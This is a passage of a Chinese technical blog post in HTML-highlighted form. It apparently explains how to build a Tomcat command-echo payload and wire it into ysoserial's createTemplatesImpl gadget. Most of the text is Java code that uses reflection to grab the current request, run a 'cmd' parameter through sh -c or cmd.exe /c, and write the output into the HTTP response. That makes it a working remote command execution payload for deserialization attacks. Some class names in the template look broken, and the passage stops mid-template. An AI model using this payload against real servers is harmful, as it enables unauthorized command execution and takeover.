&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">modifiersFiled&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setInt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">WRAP_SAME_OBJECT_FIELD&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">WRAP_SAME_OBJECT_FIELD&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getModifiers&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;~&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FINAL&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">modifiersFiled&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setInt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">lastServicedRequestField&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">lastServicedRequestField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getModifiers&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;~&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FINAL&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">modifiersFiled&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setInt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">lastServicedResponseField&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">lastServicedResponseField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getModifiers&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;~&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FINAL&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ThreadLocal&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">ServletResponse&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">lastServicedResponse&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ThreadLocal&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">ServletResponse&lt;/span>&lt;span style="color:#f92672">&amp;gt;)&lt;/span> &lt;span style="color:#111">lastServicedResponseField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ThreadLocal&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">ServletRequest&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">lastServicedRequest&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ThreadLocal&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">ServletRequest&lt;/span>&lt;span style="color:#f92672">&amp;gt;)&lt;/span> &lt;span style="color:#111">lastServicedRequestField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">WRAP_SAME_OBJECT&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">WRAP_SAME_OBJECT_FIELD&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBoolean&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">lastServicedRequest&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">lastServicedRequest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getParameter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cmd&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#75715e">// 寻找cmd参数
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#111">WRAP_SAME_OBJECT&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">lastServicedResponse&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">lastServicedRequest&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">lastServicedRequestField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ThreadLocal&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">lastServicedResponseField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ThreadLocal&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">WRAP_SAME_OBJECT_FIELD&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setBoolean&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获取response对象 在原本回显之后添加我们的内容
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ServletResponse&lt;/span> &lt;span style="color:#111">responseFacade&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">lastServicedResponse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">responseFacade&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getWriter&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Writer&lt;/span> &lt;span style="color:#111">w&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">responseFacade&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getWriter&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">responseFiled&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ResponseFacade&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;response&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">responseFiled&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Response&lt;/span> &lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Response&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">responseFiled&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">responseFacade&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">usingWriter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;usingWriter&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">usingWriter&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">usingWriter&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">usingWriter&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Boolean&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FALSE&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 回显八股
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">isLinux&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">osTyp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;os.name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">osTyp&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">osTyp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toLowerCase&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">contains&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;win&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">isLinux&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">cmds&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">isLinux&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;sh&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;-c&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;cmd.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;/c&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">in&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cmds&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">getInputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Scanner&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Scanner&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">in&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">useDelimiter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;\\a&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hasNext&lt;/span>&lt;span style="color:#f92672">()?&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#f92672">():&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">w&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">w&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>已经有了这样的模板，如何接入ysoserail的createsTemplatesImpl中呢？我们看payloads.util.Gagests.java中一般的模板都长这样&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">createTemplatesImpl&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">createTemplatesImpl&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们也照猫画虎即可，擦去泛型的部分，并改用完整的类名；同时把command稍作修改，让原本命令行控制的cmd参数变为web请求需要的参数&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// https://github.dev/kingkaki/ysoserial/blob/master/src/main/java/ysoserial/payloads/util/Gadgets.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">createTemplatesImplTomcatEcho&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">param&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">command&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#d88200">&amp;#34;cmd&amp;#34;&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">template&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;try {\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; java.lang.reflect.Field WRAP_SAME_OBJECT_FIELD = Class.forName(\&amp;#34;org.apache.catalina.coreApplicationDispatcher\&amp;#34;).getDeclaredField(\&amp;#34;WRAP_SAME_OBJECT\&amp;#34;);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; java.lang.reflect.Field lastServicedRequestField = org.apache.catalina.core.ApplicationFilterChainclass.getDeclaredField(\&amp;#34;lastServicedRequest\&amp;#34;);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; java.lang.reflect.Field lastServicedResponseField = org.apache.catalina.core.ApplicationFilterChainclass.getDeclaredField(\&amp;#34;lastServicedResponse\&amp;#34;);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; java.lang.reflect.Field modifiersField = java.lang.reflect.Field.class.getDeclaredField(\&amp;#34;modifiers\&amp;#34;)\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; modifiersField.setAccessible(true);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, 8);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; modifiersField.setInt(lastServicedRequestField, 10);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; modifiersField.setInt(lastServicedResponseField, 10);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; WRAP_SAME_OBJECT_FIELD.setAccessible(true);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; lastServicedRequestField.setAccessible(true);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; lastServicedResponseField.setAccessible(true);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; ThreadLocal lastServicedResponse = lastServicedResponseField.get(null) != null\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; ? (ThreadLocal) lastServicedResponseField.get(null)\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; : null;\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; ThreadLocal lastServicedRequest = lastServicedRequestField.get(null) != null\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; ? (ThreadLocal) lastServicedRequestField.get(null)\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; : null;\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; String cmd = lastServicedRequest != null\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; ? ((javax.servlet.ServletRequest) lastServicedRequest.get()).getParameter(\&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">command&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;\&amp;#34;\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; : null;\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; lastServicedRequestField.set(null, new ThreadLocal());\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; lastServicedResponseField.set(null, new ThreadLocal());\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
